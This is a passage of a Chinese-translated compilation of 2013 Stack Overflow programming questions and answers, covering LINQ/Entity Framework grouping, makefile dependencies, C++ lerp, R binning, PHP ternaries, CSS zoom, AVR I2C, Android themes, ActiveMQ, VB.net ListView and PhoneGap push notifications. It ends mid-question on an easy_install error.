    Features = new List<FeatureDto> { 
        new FeatureDto { Id = 13, Name = "Barras de Tejadilho" },
        new FeatureDto { Id = 15, Name = "Retrovisores Aquecidos" },
        new FeatureDto { Id = 16, Name = "Retrovisores Elétricos" }
    },
}); 
```

基于实体：

```
public class Category
{
    public int Id { get; set; }
    public string Name { get; set; }
}

public class CategoryFeatureGroupFeature
{
    [Key]
    [Column("Category_Id", Order = 0)]
    public int Category_Id { get; set; }

    [Key]
    [Column("FeatureGroup_Id", Order = 1)]
    public int FeatureGroup_Id { get; set; }

    [Key]
    [Column("Feature_Id", Order = 2)]
    public int Feature_Id { get; set; }
}

public class Feature
{
    public int Id { get; set; }
    public string Name { get; set; }
}

public class FeatureGroup
{
    public int Id { get; set; }
    public string Name { get; set; }
} 
```

基本上，这个想法是获取按 FeatureGroup 分组的类别的所有特征。

**编辑：**

我正在尝试将信息放入此模型中：

```
public class FeatureCategoryFeatures
{
    public FeatureGroup FeatureGroup { get; set; }
    public IList<Feature> Features { get; set; }
} 
```

如何使用 LINQ 和 Entity Framework 实现这一点？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T09:07:16.987

可能这会起作用 - 我没有检查过。

非常糟糕的代码：

```
List<CategoryFeatureGroupFeature> cfcgQ = new List<CategoryFeatureGroupFeature>();
        List<Category> cat = new List<Category>();
        List<Feature> fe = new List<Feature>();
        List<FeatureGroup> feag = new List<FeatureGroup>();

        var query = (from p in cfcgQ
                     join q in feag on p.FeatureGroup_Id equals q.Id
                     join r in fe on p.Feature_Id equals r.Id
                     where p.Category_Id == 1
                     select new { q.Name, q.Id, FeatureName = r.Name }).GroupBy(p => new { p.Name, p.FeatureName, p.Id }).ToList().OrderBy(p => p.Key.FeatureName).ThenBy(p => p.Key.Name); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:17:37.043

我稍微修改了答案，假设类别可以有多个组（希望我的假设是正确的）。我使用匿名对象作为返回结果，但意图应该很清楚。

```
/*** DATA ***/
IList<Feature> featuresList = new List<Feature> { 
        new Feature { Id = 13, Name = "Barras de Tejadilho" },
        new Feature { Id = 15, Name = "Retrovisores Aquecidos" },
        new Feature { Id = 16, Name = "Retrovisores Elétricos" },
        new Feature { Id = 7, Name = "Bancos Traseiros Rebatíveis" },
        new Feature { Id = 35, Name = "Computador de Bordo" },
        new Feature { Id = 38, Name = "Suporte para Telemóvel" },
        new Feature { Id = 1, Name = "2nd Exterior Feature" }
};
IList<FeatureGroup> featureGroupList = new List<FeatureGroup>{
    new FeatureGroup { Id = 1, Name = "Interior" },
    new FeatureGroup { Id = 2, Name = "Exterior" },
    new FeatureGroup { Id = 3, Name = "2nd Exterior" }
};
IList<Category> categoryList = new List<Category>{
    new Category{ Id=1, Name="All interior" },
    new Category { Id=2, Name="All exterior" }
};
IList<CategoryFeatureGroupFeature> cfcList = new List<CategoryFeatureGroupFeature>
{
    new CategoryFeatureGroupFeature { Category_Id = 1, FeatureGroup_Id = 1, Feature_Id = 7 },
    new CategoryFeatureGroupFeature { Category_Id = 1, FeatureGroup_Id = 1, Feature_Id = 35 },
    new CategoryFeatureGroupFeature { Category_Id = 1, FeatureGroup_Id = 1, Feature_Id = 38 },
    new CategoryFeatureGroupFeature { Category_Id = 2, FeatureGroup_Id = 2, Feature_Id = 13 },
    new CategoryFeatureGroupFeature { Category_Id = 2, FeatureGroup_Id = 2, Feature_Id = 15 },
    new CategoryFeatureGroupFeature { Category_Id = 2, FeatureGroup_Id = 2, Feature_Id = 16 },
    new CategoryFeatureGroupFeature { Category_Id = 2, FeatureGroup_Id = 3, Feature_Id = 1 }
};

/*** QUERY ***/
var result = from c in categoryList
                select new {
                    Id = c.Id,
                    Name = c.Name,
                    FeatureGroups = from fg in featureGroupList
                                    where (from cfc in cfcList
                                        where cfc.Category_Id == c.Id
                                        select cfc.FeatureGroup_Id).Distinct()
                                    .Contains(fg.Id)
                                    select new {
                                        Id = fg.Id,
                                        Name = fg.Name,
                                        Features = (from f in featuresList
                                                join cfc2 in cfcList on f.Id equals cfc2.Feature_Id
                                                where cfc2.FeatureGroup_Id == fg.Id
                                                select f).Distinct()
                                    }
                }; 
```

`join`您可以使用和的组合获得相同的结果`group by`，但我选择了`Distinct()`.

# makefile - make 中的高级自动依赖

> ID：14853841
> 
> 赞同：2
> 
> 时间：2013-02-13T12:42:41.760
> 
> 标签：makefile, dependency-management

我一直在阅读[此网页上](http://mad-scientist.net/make/autodep.html)的 make 手册第 4.14 节“自动生成先决条件”和“高级自动依赖项” 。

我想我理解了制作手册中的部分，但是在我链接的网页上，我无法理解一件事：

> 如果你仔细想想，这个重新调用真的是不需要的。由于我们知道目标的某些先决条件发生了变化，因此在此构建中我们真的不需要更新的先决条件列表。我们已经知道我们将重建目标，并且拥有更新的列表不会影响该决定。

所以不要这样做：

```
 %.P : %.c
          $(MAKEDEPEND)
          @sed 's/\($*\)\.o[ :]*/\1.o $@ : /g' < $*.d > $@; \
             rm -f $*.d; [ -s $@ ] || rm -f $@

  include $(SRCS:.c=.P) 
```

他们是这样：

```
 %.o : %.c
          @$(MAKEDEPEND)
          $(COMPILE.c) -o $@ $<

  -include $(SRCS:.c=.P) 
```

但是，如果我们知道目标先决条件已更改，我们是否不必更新该目标的依赖关系列表？这不正是第一次调用make时所做的吗？我的理解是包含语句中包含的文件看起来像：

```
list.o list.P : list.cc list.h debug.h 
```

我没有得到什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T13:20:42.387

关键是不存在或过时的对象不需要依赖列表。无论如何都要重建。

由于`.P`和`.c`文件的依赖项由于其相同的先决条件而始终相同，因此我们不必将它们分开保存，而只需在构建对象时构建依赖项文件。

当目标先决条件发生变化时，将重新构建对象，并更新依赖关系列表作为副作用。我们不需要这个 make run 中的列表，只需要下一个，因为无论如何我们都会在这个 run 中重新构建对象。

第一次调用`make`不需要依赖列表，并且纯粹基于每个对象进行操作。作为生成对象的副作用，会生成依赖列表，并且下一次`make`运行会找到它们。

依赖文件如下所示：

```
list.o : list.cc list.h debug.h 
```

由于上述原因，根本不需要在其中提及依赖文件。

# c++ - “补间”的 lerp 实现

> ID：14853845
> 
> 赞同：6
> 
> 时间：2013-02-13T12:42:50.293
> 
> 标签：c++, interpolation, linear-interpolation

我有这个作为我的[lerp](https://en.wikipedia.org/wiki/Lerp_%28computing%29)功能：

```
 Vec2f lerp(float t, Vec2f a, Vec2f b){
      return (1-t)*a + t*b;
  } 
```

我在下面有以下代码，我希望这会产生“补间”：

```
 Vec2f a(0,0);
    Vec2f b(3,4);
    Vec2f c(5,4);
    Vec2f d(5,0);

    if( i < 100 ){
        if(i <= 30){
            ball.pos = lerp(i, a, b);
        }
        else if(i > 30 && i < 80){
            ball.pos = lerp(i, b, c);
        }
        else {
            ball.pos = lerp(i, a, d);
        }
    } i += 1; 
```

但我得到的是一个“不连续的补间”，即不是从 A 到 B 的 lerp 结束的最后一点开始，而是从其他地方开始，有些是针对其他 lerp 的。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T12:46:34.313

`t`在您的插值函数中必须介于 0 和 1 之间，但您传递的值介于 0 和 100 之间。将调用更改为`lerp(i/100.0f, a, b)`等等。（重要的是您将 100.0 指定为浮点文字，而不是整数文字！）

正如DarenW正确指出的那样，您必须为每个段覆盖从0到1的范围以获得所需的效果，即在您的情况下，`lerp(i/30.0f, a, b)`,`lerp((i-30)/50.0f, a, b)`等。

# r - 在 data.table 的列中“分组”实数

> ID：14853848
> 
> 赞同：2
> 
> 时间：2013-02-13T12:43:11.833
> 
> 标签：r, data.table

我有一个`data.table`，`DT`其中包含一个`C`具有满足不等式的实值条目的列`0 < x <= 1`。我想按例如 10 的间隔对这些条目进行“分组”。具体来说，对于我想要分配值 0.1 的所有值`x`，对于我想要分配值 0.2 等的所有值`C``0 < x <=0.1``x``C``0.1 < x <=0.2`

下面是我编写的函数，我认为它可以让我这样做（很简单，我对 R 比较陌生！）。

```
r = function(x,N){

  v = numeric(10)
  for(i in 1:N)
    v[i] = i/N*(x>(i-1)/N & x<=i/N)
   v = v[v!=0]
  return(v)

} 
```

`N`我需要的间隔数在哪里。但是，代码：

```
DT = DT[,newC:=r(x=C,N=10)] 
```

给出以下错误：

```
Warning messages:
1: In v[i] = i/10 * (x > (i - 1)/10 & x <= i/10) :
  number of items to replace is not a multiple of replacement length
2: In v[i] = i/10 * (x > (i - 1)/10 & x <= i/10) :
  number of items to replace is not a multiple of replacement length
...
10: In v[i] = i/10 * (x > (i - 1)/10 & x <= i/10) :
  number of items to replace is not a multiple of replacement length 
```

非常感谢任何帮助！干杯

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T22:42:42.397

一种（更快的）替代方法是使用`findInterval`，它的工作与 非常相似`cut`，但避免了 to`factor`和 from`factor`转换

```
 z1 <- findInterval(x,y)
  z1 <- tail(y,-1)[z1] 
```

还有一些基准测试

```
cutting <- function(){
  z <- cut(x,y,labels=tail(y,-1))
  #this generates a factor: 
  #you can convert it back to numeric
   z <- as.numeric(levels(z))[z]
  }

finding <- function(){
 z1 <- findInterval(x,y)
 z1 <- tail(y,-1)[z1]
}

microbenchmark(cutting(),finding())

##     Unit: microseconds
##       expr    min       lq   median      uq     max
## 1 cutting() 188.50 192.1175 193.6275 195.821 354.701
## 2 finding()  34.18  35.5140  37.5620  38.763  46.397 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T13:28:47.383

如果您在函数中尝试一行 for 循环，请使用`i = 1`and说`x = C`：

```
DT[,1/10 * (C > (1-1)/10 & C <= 1/10)] 
```

你会注意到你得到了一个长度相同的向量`C`。错误是说您不能将长度 > 1 的向量分配给`v[i]`. 单步执行您的函数（使用`debug`,`traceback`和之类的函数`browser`）以确保您获得所需的正确输入是一个好主意。

这是使您的功能正常工作的一种方法：

```
r = function(x,N){

  for(i in 1:N)
    x[x>(i-1)/N & x<=i/N] <- i/N
  return(x)

} 
```

R 也有这样做的内置方法：

```
#sample data
set.seed(1)
x <- runif(100)
#to organize your data
y <- seq(0,1,.1)
z <- cut(x,y,labels=tail(y,-1))
#this generates a factor: 
#you can convert it back to numeric
z <- as.numeric(levels(z))[z] 
```

# php - 简写 if 语句 PHP

> ID：14853859
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:43:45.967
> 
> 标签：php, shorthand-if

这是一个非常基本的问题，我很乐意提出，但对我来说理解它真的很有用，所以我将来可以使用这种方法，

我怎么转

```
if($_GET['page']) {
  $page = $_GET['page'];
} else {
  $page = 0;
} 
```

变成一个简单的 1 行速记结果？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T12:45:13.153

尝试 ：

```
$page = $_GET['page'] ? $_GET['page'] : 0; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T12:53:10.700

你的陈述的一个**真正简单**的速记就是

```
$page = $_GET['page']; 
```

这对大多数情况来说就足够了。

但是您的真正意思是`if (isset($_GET['page']))`，不仅`if ($_GET['page'])`
如此，还可以使用这些三元组之一。

但是，对于像我这样的变量，`$page`我会使用不同的策略，称为“**定义你的变量！** ”

因此，对于基本变量，我将首先定义它们。

```
$page = 0; 
```

然后，在处理请求时，将其设置为某个值，存在

```
if(isset($_GET['page'])) {
    if (!is_numeric($_GET['page'])) {
         throw new HTTP400()
    } else {
        $page = $_GET['page'];
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T12:46:12.807

```
$page=(isset($_GET['page']))?$_GET['page']:0; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T12:47:12.737

我建议你也使用 isset() 来更好地处理错误。

```
$page = (isset($_GET['page'])) ? $_GET['page'] : 0; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T12:47:48.450

我会添加标准检查：

```
$page=isset($_GET['page'])?$_GET['page']:0; 
```

# html - 文本流和 css3 缩放属性

> ID：14853861
> 
> 赞同：0
> 
> 时间：2013-02-13T12:43:49.493
> 
> 标签：html, css, zooming, scale

我有一个包含文本的 div。在编辑模式下，这个 div 使用 css 缩小到大约 0.9 以适应我的管理界面。然而，在演示模式下，它并没有被缩小，而且 - 借来看看 - 文本的流动完全不同。换行符在完全不同的地方。

有没有办法解决这个问题，还是我只需要在编辑过程中放弃缩小？

查看这些图片的右下角...首先是编辑模式下的缩放版本，然后是演示模式的全尺寸、未缩放、未缩放版本。

![缩放](../Images/b18351c0b671fe86c16ceafdca26907d.png)

![全尺寸](../Images/e0804f5ee9488640d6b0756820935753.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-07T18:11:06.820

我不知道我是否 100% 复制了您的问题；但是我准备了一个类似的布局，在 Chrome 中发现了和你一样的问题。

但是将缩放更改为

```
-webkit-transform: scale(0.9);
-ms-transform: scale(0.9);
transform: scale(0.9); 
```

解决了 Chrome 中的问题。

在 IE10 中，问题没有出现。

不过没试过其他浏览器。

如果需要支持 IE 8，我会尝试：

```
#transformedObject {

/* IE8+ - must be on one line, unfortunately */ 
-ms-filter: "progid:DXImageTransform.Microsoft.Matrix(M11=0.9, M12=0, M21=0, M22=0.9, SizingMethod='auto expand')"; 
```

这取自[useragentman web](http://www.useragentman.com/IETransformsTranslator/)，我没试过

我看到我之前的评论解释得不好：在我在 IE10 中的测试中，缩放和转换都运行良好。我不知道我是否准确地重现了这个问题，所以我不知道我是否解决了它；但我至少看起来进行更改是安全的。

在测试中看到它：

## [小提琴](http://jsfiddle.net/vals/3RxG7/embedded/result/)

当您选中复选框时，div 的宽度会增加，只是为了查看对布局的不同调整。div 是：原始、转换（绿色）缩放（红色）以及转换和缩放叠加以查看差异。至少在 IE 10 中，转换和缩放都等同于原始版本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-08T11:03:22.297

在网页中，您没有适当的文本流控制。这主要是因为不同平台上的不同浏览器对字体字形的呈现方式不同。您的文本的跟踪也会有所不同。因此，如果您优化您的文本以在您自己的浏览器上看起来很棒，它可能会吸引不同的浏览器。所以告别网络浏览器中的像素精确文本表示。这是一个渺茫的希望。

PS：
请勿`text-align: justify`在网页上使用。真的很烂。

# arduino - 使用 AVR TWI 接口的问题

> ID：14853862
> 
> 赞同：0
> 
> 时间：2013-02-13T12:43:51.290
> 
> 标签：arduino, avr, i2c, atmel, atmega

我正在尝试使用 atmega2560 访问 HMC5883L 模块。我编写了一个类 (I2C)，其中包含 I2C 通信所必需的基本方法。

首先，我将解释问题。这就是我所做的。

```
int main(){
    I2C i2c;  //an object with basic I2C communication methods

    i2c.init();
    i2c.start();
    i2c.sendSLAW();
    ...
    i2c.write(...);
    ...  //configure registers, CRA, CRB, MR ...
    i2c.stop();
    while (1)
    {
        i2c.start();        
        i2c.sendSLAR();     
            .... //read x,y,z register values
        i2c.stop();     
            .... //say, display x,y,z readings
        _delay_ms(500);
    }
} 
```

（考虑术语有它们的普通含义。SLAW = SLA+W（从地址+写入）...）

一切顺利，直到进入 while 循环。在循环中，它似乎被困在`i2c.stop()`

`i2c.stop()`是这样实现的；

```
void I2C::I2C_stop(){
    TWCR = (1<<TWINT)|(1<<TWSTO)|(1<<TWEN);
    while (TWCR & (1<<TWSTO));
} 
```

我做错了什么吗？我该如何解决这个问题？

（所有其他功能都按照数据表示例中的方式简单实现。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T17:00:39.810

```
while (TWCR & (1<<TWSTO)); 
```

看起来不对。TWSTO 标志表示停止，并且您正确地写入它以停止。但它保持为 1，这会产生一个无限循环。如果有的话，你会想要

```
while !(TWCR & (1<<TWSTO)); 
```

但是代码示例根本没有循环。

# android - 更改动画活动之间的背景颜色

> ID：14853868
> 
> 赞同：1
> 
> 时间：2013-02-13T12:44:16.653
> 
> 标签：android, animation, android-activity, background

我在 Android 上相对较新，我的英语还不错.. 但一切都是第一次。

我对两个带有翻译的动画活动之间的背景有疑问。我试图通过来自 theme.light 的新主题父级来更改它。

这是代码：

```
<color name="custom_theme_color">#d1e3e3</color>
<style name="CustomTheme" parent="android:Theme.Light.NoTitleBar.Fullscreen">
    <item name="android:windowBackground">@color/custom_theme_color</item>
    <item name="android:colorBackground">@color/custom_theme_color</item> 
</style> 
```

但有了这个，我也是一样的。活动之间的背景仍然是黑色的。

感谢您的任何帮助或指示！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:57:55.020

您正在为 windowBackground 和 colorBackground 调用相同的自定义颜色，因为它始终是相同的颜色，并且不会改变。

```
<color name="custom_theme_color">#d1e3e3</color>
<style name="CustomTheme" parent="android:Theme.Light.NoTitleBar.Fullscreen">
    <item name="android:windowBackground">@color/custom_theme_color</item> --look
    <item name="android:colorBackground">@color/custom_theme_color</item> --look
</style> 
```

我希望这会有所帮助，因为我现在无法测试。

# java - 在activemq中没有加载PageFile异常

> ID：14853869
> 
> 赞同：2
> 
> 时间：2013-02-13T12:44:20.957
> 
> 标签：java, jms, activemq, message-queue, spring-jms

我`PageFile is not loaded`在生产环境中生成预定消息时出现异常。在网上搜索并没有找到任何解决方案后，我编写了一个用于模拟生产环境的简单程序。我展示了我的程序并解释了抛出异常的场景：

```
public static void main(String[] args) throws Throwable
{
    final ActiveMQConnectionFactory conFactory = new ActiveMQConnectionFactory("tcp://localhost:61616");
    final QueueConnection connection = conFactory.createQueueConnection();
    final Session session = connection.createQueueSession(false, Session.AUTO_ACKNOWLEDGE);
    final Destination destination = new ActiveMQQueue("MJ_SAF");
    final MessageProducer producer = session.createProducer(destination);

    ActiveMQMessage message = (ActiveMQMessage) session.createTextMessage("Hello World!");
    message.setPersistent(true);
    message.setLongProperty(ScheduledMessage.AMQ_SCHEDULED_DELAY, 1000);
    message.setLongProperty(ScheduledMessage.AMQ_SCHEDULED_PERIOD, 0);
    message.setIntProperty(ScheduledMessage.AMQ_SCHEDULED_REPEAT, 1);
    producer.send(message);

    producer.close();
    session.close();
    connection.close();
} 
```

执行此代码后，`MJ_SAF`当消息在调度队列中并且不发送主队列（`MJ_SAF`）时，我将其删除。然后我再次运行上面的程序，但出现以下异常：

```
DEBUG  [main] o.a.a.transport.WireFormatNegotiator - Sending: WireFormatInfo { version=9, properties={MaxFrameSize=9223372036854775807, CacheSize=1024, CacheEnabled=true, SizePrefixDisabled=false, MaxInactivityDurationInitalDelay=10000, TcpNoDelayEnabled=true, MaxInactivityDuration=30000, TightEncodingEnabled=true, StackTraceEnabled=true}, magic=[A,c,t,i,v,e,M,Q]}
DEBUG  [ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@2422] o.a.a.transport.InactivityMonitor - Using min of local: WireFormatInfo { version=9, properties={MaxFrameSize=9223372036854775807, CacheSize=1024, CacheEnabled=true, SizePrefixDisabled=false, MaxInactivityDurationInitalDelay=10000, TcpNoDelayEnabled=true, MaxInactivityDuration=30000, TightEncodingEnabled=true, StackTraceEnabled=true}, magic=[A,c,t,i,v,e,M,Q]} and remote: WireFormatInfo { version=9, properties={CacheSize=1024, MaxFrameSize=9223372036854775807, CacheEnabled=true, SizePrefixDisabled=false, TcpNoDelayEnabled=true, MaxInactivityDurationInitalDelay=10000, MaxInactivityDuration=30000, TightEncodingEnabled=true, StackTraceEnabled=true}, magic=[A,c,t,i,v,e,M,Q]}
DEBUG  [ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@2422] o.a.a.transport.WireFormatNegotiator - Received WireFormat: WireFormatInfo { version=9, properties={CacheSize=1024, MaxFrameSize=9223372036854775807, CacheEnabled=true, SizePrefixDisabled=false, TcpNoDelayEnabled=true, MaxInactivityDurationInitalDelay=10000, MaxInactivityDuration=30000, TightEncodingEnabled=true, StackTraceEnabled=true}, magic=[A,c,t,i,v,e,M,Q]}
DEBUG  [ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@2422] o.a.a.transport.WireFormatNegotiator - tcp://localhost/127.0.0.1:61616@2422 before negotiation: OpenWireFormat{version=9, cacheEnabled=false, stackTraceEnabled=false, tightEncodingEnabled=false, sizePrefixDisabled=false, maxFrameSize=9223372036854775807}
DEBUG  [ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@2422] o.a.a.transport.WireFormatNegotiator - tcp://localhost/127.0.0.1:61616@2422 after negotiation: OpenWireFormat{version=9, cacheEnabled=true, stackTraceEnabled=true, tightEncodingEnabled=true, sizePrefixDisabled=false, maxFrameSize=9223372036854775807}
DEBUG  [ActiveMQ Transport: tcp://localhost/127.0.0.1:61616@2422] o.a.activemq.util.ThreadPoolUtils - Shutdown of ExecutorService: java.util.concurrent.ThreadPoolExecutor@2f48d2 is shutdown: true and terminated: true took: 0.000 seconds.
DEBUG  [main] o.a.activemq.util.ThreadPoolUtils - Shutdown of ExecutorService: java.util.concurrent.ThreadPoolExecutor@296f76 is shutdown: true and terminated: false took: 0.000 seconds.
DEBUG  [main] o.a.a.transport.tcp.TcpTransport - Stopping transport tcp://localhost/127.0.0.1:61616@2422
DEBUG  [ActiveMQ Connection Executor: tcp://localhost/127.0.0.1:61616@2422] o.apache.activemq.ActiveMQConnection - Async exception with no exception listener: java.lang.IllegalStateException: PageFile is not loaded
java.lang.IllegalStateException: PageFile is not loaded
    at org.apache.kahadb.page.PageFile.assertLoaded(PageFile.java:809) ~[kahadb-5.7.0.jar:5.7.0]
    at org.apache.kahadb.page.PageFile.tx(PageFile.java:303) ~[kahadb-5.7.0.jar:5.7.0]
    at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.getMessageCount(KahaDBStore.java:479) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.store.ProxyMessageStore.getMessageCount(ProxyMessageStore.java:101) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.region.Queue.initialize(Queue.java:376) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.region.DestinationFactoryImpl.createDestination(DestinationFactoryImpl.java:86) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.region.AbstractRegion.createDestination(AbstractRegion.java:532) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.jmx.ManagedQueueRegion.createDestination(ManagedQueueRegion.java:56) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:137) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:283) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.region.RegionBroker.addProducer(RegionBroker.java:361) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.jmx.ManagedRegionBroker.addProducer(ManagedRegionBroker.java:281) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:93) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.CompositeDestinationBroker.addProducer(CompositeDestinationBroker.java:56) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.BrokerFilter.addProducer(BrokerFilter.java:93) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.MutableBrokerFilter.addProducer(MutableBrokerFilter.java:99) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:511) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:105) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:152) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:256) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222) ~[activemq-core-5.7.0.jar:5.7.0]
    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204) ~[activemq-core-5.7.0.jar:5.7.0]
    at java.lang.Thread.run(Thread.java:662) ~[na:1.6.0_13]
DEBUG  [main] o.a.a.thread.TaskRunnerFactory - Initialized TaskRunnerFactory[ActiveMQ Task] using ExecutorService: java.util.concurrent.ThreadPoolExecutor@6295eb
DEBUG  [ActiveMQ Task-1] o.a.a.transport.tcp.TcpTransport - Closed socket Socket[addr=localhost/127.0.0.1,port=61616,localport=2422]
DEBUG  [main] o.a.activemq.util.ThreadPoolUtils - Forcing shutdown of ExecutorService: java.util.concurrent.ThreadPoolExecutor@6295eb 
```

我使用`Apache ActiveMQ 5.7`版本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T11:49:32.580

ActiveMQ 中的 KahaDB 经历了最近几个版本的大量强化工作。我记得在这个领域修复了一些问题，即在使用的分页列表和树中，由于竞争条件可能导致这样的异常。最新版本 v5.8.0 刚刚发布，其中包含我们使用 KahaDB 完成的所有最新工作，我建议用户尽快迁移到该版本。

# vb.net - ListView 与 FTP VB.net

> ID：14853870
> 
> 赞同：0
> 
> 时间：2013-02-13T12:44:28.213
> 
> 标签：vb.net, listview

我想在 ListView 上显示我的 FTP 服务器上的目录和文件。我是 ListViews 的新手，所以有人可以帮我开始吗？

代码：

```
Dim newSelected As TreeNode = e.Node
        ListView1.Items.Clear()
        Dim nodeDirInfo As DirectoryInfo = _
        CType(newSelected.Tag, DirectoryInfo)
        Dim subItems() As ListViewItem.ListViewSubItem
        Dim item As ListViewItem = Nothing

        Dim dir As DirectoryInfo
        For Each dir In nodeDirInfo.GetDirectories()
            item = New ListViewItem(dir.Name, 0)
            subItems = New ListViewItem.ListViewSubItem() _
                {New ListViewItem.ListViewSubItem(item, "Directory"), _
                New ListViewItem.ListViewSubItem(item, _
                dir.LastAccessTime.ToShortDateString())}

            item.SubItems.AddRange(subItems)
            ListView1.Items.Add(item)
        Next dir
        Dim file As FileInfo
        For Each file In nodeDirInfo.GetFiles()
            item = New ListViewItem(file.Name, 1)
            subItems = New ListViewItem.ListViewSubItem() _
                {New ListViewItem.ListViewSubItem(item, "File"), _
                New ListViewItem.ListViewSubItem(item, _
                file.LastAccessTime.ToShortDateString())}

            item.SubItems.AddRange(subItems)
            ListView1.Items.Add(item)
        Next file 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T17:08:20.193

如果没有目录被添加到 Listview，很可能是因为它`nodeDirInfo.GetDirectories`是空的。设置断点并检查其内容。它可能与 ListView 本身无关。路径 NewSelected.Tag 中是否有任何子目录？

# ios - Pushwoosh IOS phonegapp 代码集成

> ID：14853871
> 
> 赞同：0
> 
> 时间：2013-02-13T12:44:28.833
> 
> 标签：ios, phonegap-plugins

您好，我目前正在开发我的 ios pushwoosh phonegapp 应用程序。我正在遵循本[指南](http://www.pushwoosh.com/programming-push-notification/push-notification-sdk-integration-for-phonegap/)：

我不知道我需要在哪里实现此代码：

```
In your onDeviceReady function add:
initPushwoosh();

bind: function() {
document.addEventListener('deviceready', this.deviceready, false);
},
deviceready: function() {
// note that this is an event handler so the scope is that of the event
// so we need to call app.report(), and not this.report()
initPushwoosh();

app.report('deviceready');
}, 
```

还有这个代码我需要放在同一个文件中吗？接收推送通知。请参阅 initPushwoosh 函数中的以下代码片段

```
document.addEventListener('push-notification', function(event) {
var notification = event.notification;
navigator.notification.alert(notification.aps.alert);
pushNotification.setApplicationIconBadgeNumber(0);
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-25T15:49:55.783

看看这个 phonegap 集成的工作示例： [https ://github.com/shaders/push-notifications-sdk/tree/master/SDK%20Sample%20Projects/iPhone-Phonegap](https://github.com/shaders/push-notifications-sdk/tree/master/SDK%20Sample%20Projects/iPhone-Phonegap)

和这个javascript文件，它显示了你应该在哪里实现提供的代码： [https ://github.com/shaders/push-notifications-sdk/blob/master/SDK%20Sample%20Projects/iPhone-Phonegap/www/js/index .js](https://github.com/shaders/push-notifications-sdk/blob/master/SDK%20Sample%20Projects/iPhone-Phonegap/www/js/index.js)

# python - easy_install pywebkitgtk 错误：找不到安装脚本

> ID：14853872
> 
> 赞同：1
> 
> 时间：2013-02-13T12:44:32.520
> 
> 标签：python, easy-install

我尝试从 slax 中的源代码安装 turpial（一个 twitter 客户端），它需要 pywebkitgtk 才能工作。但是在使用 easy_install 安装它时出现错误。

控制台输出：

```
root@slax:~# easy_install pywebkitgtk
Searching for pywebkitgtk
